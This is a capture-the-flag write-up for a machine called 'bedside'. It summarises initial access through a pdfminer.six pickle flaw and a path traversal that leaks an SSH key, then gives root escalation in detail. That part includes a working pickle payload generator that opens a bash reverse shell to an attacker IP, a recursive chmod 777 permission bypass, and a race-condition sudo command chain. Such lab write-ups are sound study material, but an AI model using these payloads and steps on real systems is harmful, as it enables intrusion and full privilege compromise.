### 1. Overview
This challenge involved exploiting a web application running `pdfminer.six` to achieve initial access via a PDF parsing vulnerability. After gaining a shell inside a Docker container, an internal development server running Vite with Hot Module Replacement (HMR) was discovered. A path traversal vulnerability in the development server allowed the extraction of an SSH private key for the `developer` user. Privilege escalation was achieved by abusing a machine learning training script that could be run via `sudo`. By manipulating directory permissions and winning a race condition, a malicious PyTorch checkpoint was loaded, resulting in arbitrary code execution and root access.

### 3. Foothold
`CVE-2025-64512` affects `pdfminer.six` when parsing a malicious PDF file that includes compressed pickle files as CMap resources.

### 4. Root
Once logged into SSH, I started enumerating the system. The first thing I checked was `sudo -l` which returned a python script I could run as sudo without a password:
```
developer@bedside:~$ sudo -l
User developer may run the following commands on bedside:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

Analyzing the code of that Python script I found a vulnerability. The script is designed to load medical images from `/datastore/processed`, build a PyTorch neural network model using the MONAI framework, and then load the most recent training checkpoint (`.pt` file) to resume training.

The vulnerability lies in how the script loads the most recent checkpoint:
```
from monai.handlers import CheckpointLoader 
# ...
latest_ckpt = find_latest_checkpoint(CHECKPOINT_DIR)
# ...
if latest_ckpt:
    loader = CheckpointLoader(
        load_path=str(latest_ckpt),
        load_dict={"model": model, "optimizer": optimizer},
        map_location=DEVICE
    )
    # ...
    loader(engine)  # Invokes the handler directly, deserializing the file
```

PyTorch and MONAI checkpoint loading relies on Python's `pickle` module, and because `pickle` deserialization allows for arbitrary code execution, loading an untrusted `.pt` file can result in RCE.

To exploit this, I needed to place a malicious `exploit.pt` file in `/datastore/checkpoints`. However, the `developer` user did not have the right permissions to access this directory.

To bypass this, I used the reverse shell from my initial access as the `datawrangler` user. This user had access to the `/datastore` directory pipeline, so I modified the permissions using `chmod 777 -R /datastore` to give the `developer` user the needed access.

Once I was able to write files as the `developer` user, I generated a malicious `pickle.pt` file using the following script:
```
import pickle

ATTACKER_IP = "10.10.14.60"

commandInjection = f"bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/9001 0>&1'"

class RCE:
    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        osModule = __builtins__.__import__('os')
        return (osModule.system, (self.cmd,))

payload = RCE(commandInjection)
with open("exploit.pt", "wb") as f:
    pickle.dump(payload, f)
```

After generating the file, I uploaded it to the `/datastore/checkpoints` folder using `scp`:
```
╰─❯ scp -i id_rsa exploit.pt developer@bedside.htb:/datastore/checkpoints
exploit.pt                                                              100%   89     1.2KB/s   00:00
```

I then generated a dummy image file for the trainer script to load, allowing it to proceed to the checkpoint loading phase:
```
developer@bedside:/datastore$ echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==" | base64 -d > /datastore/staging/dummy.png
```

Finally, I started a netcat listener on port 9001. A background process was actively dropping `.txt` files into the staging and processed folders, causing the trainer script to crash. To beat this process, I deleted the `.txt` files and ran the trainer script as sudo in a single chained command to win the race condition:
```
developer@bedside:/datastore$ rm -rf /datastore/processed/*.txt /datastore/staging/*.txt && sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

This executed the reverse shell and provided root access.
### 5. Conclusion
Initial access was obtained through a PDF parsing vulnerability in `pdfminer.six` using a malicious PDF containing a compressed pickle payload. Once inside the container, internal enumeration revealed a local development server running on port 3000. Forwarding the port and exploiting a path traversal vulnerability in the development server allowed the extraction of the `developer` user's SSH key.

Privilege escalation was achieved by exploiting a `NOPASSWD` sudo entry for a machine learning training script. After altering the directory permissions using the initial `datawrangler` shell and bypassing a background process via a race condition, a malicious PyTorch checkpoint was loaded, resulting in a root shell.
